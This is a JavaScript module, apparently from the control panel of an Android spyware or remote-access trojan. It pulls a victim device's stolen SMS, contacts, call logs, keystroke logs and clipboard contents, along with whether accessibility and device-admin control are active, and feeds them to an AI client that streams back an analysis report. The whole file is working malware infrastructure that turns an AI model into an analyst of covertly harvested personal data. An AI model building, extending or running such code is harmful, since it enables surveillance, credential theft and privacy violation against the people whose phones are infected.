const { EventEmitter } = require('events');

class AiAnalysis extends EventEmitter {
    constructor(groqClient, dataStore, phantomServer) {
        super();
        this.groq = groqClient;
        this.dataStore = dataStore;
        this.phantomServer = phantomServer;
        this.running = false;
        this.cancelled = false;
    }

    cancel() {
        this.cancelled = true;
        this.emit('cancelled', {});
    }

    async _collect(deviceId, scope) {
        const ctx = { scope, deviceId, collected: {}, warnings: [] };
        const wantAll = scope === 'all';
        const has = (k) => wantAll || (Array.isArray(scope) ? scope : [scope]).indexOf(k) !== -1;

        try {
            if (this.dataStore) {
                if (has('sms'))       ctx.collected.sms = await this.dataStore.getSMS(deviceId);
                if (has('contacts'))  ctx.collected.contacts = await this.dataStore.getContacts(deviceId);
                if (has('calls'))     ctx.collected.calls = await this.dataStore.getCalls(deviceId);
                if (has('keylog'))    ctx.collected.keylog = await this.dataStore.getKeylogs(deviceId);
                if (has('clipboard')) ctx.collected.clipboard = await this.dataStore.getClipboard(deviceId);
            }
        } catch (e) { ctx.warnings.push('DB: ' + e.message); }

        try {
            const dev = this.phantomServer && this.phantomServer.getDevice(deviceId);
            if (dev) ctx.collected.device = {
                model: dev.model, android: dev.androidVersion, carrier: dev.carrier,
                country: dev.country, battery: dev.battery,
                accessibility: dev.accessibilityEnabled, admin: dev.adminActive,
                lastSeen: dev.lastSeen
            };
        } catch (e) { ctx.warnings.push('device: ' + e.message); }

        return ctx;
    }

    async run(deviceId, scope) {
        if (this.running) return { ok: false, error: 'Analysis already running' };
        if (!this.groq) return { ok: false, error: 'AI client not configured' };
        if (!deviceId) return { ok: false, error: 'No device selected' };

        this.running = true;
        this.cancelled = false;
        this.emit('start', { deviceId, scope });
        const started = Date.now();

        try {
            const ctx = await this._collect(deviceId, scope);
            
            this.emit('chunk', { text: '## Analyzing ' + (scope === 'all' ? 'all scopes' : scope) + '...\n\n' });

            const res = await this.groq.runAnalysis(scope, ctx.collected, (token, acc) => {
                if (this.cancelled) return;
                this.emit('chunk', { text: token });
            });

            if (this.cancelled) {
                this.emit('cancelled', {});
                return { ok: false, error: 'cancelled' };
            }

            const report = (res && res.content) || '';
            const elapsed = ((Date.now() - started) / 1000).toFixed(1);
            this.emit('done', { deviceId, scope, report, elapsed, warnings: ctx.warnings });
            return { ok: true, report, elapsed, warnings: ctx.warnings };
        } catch (err) {
            this.emit('error', { error: err.message || String(err) });
            return { ok: false, error: err.message || String(err) };
        } finally {
            this.running = false;
        }
    }
}

module.exports = AiAnalysis;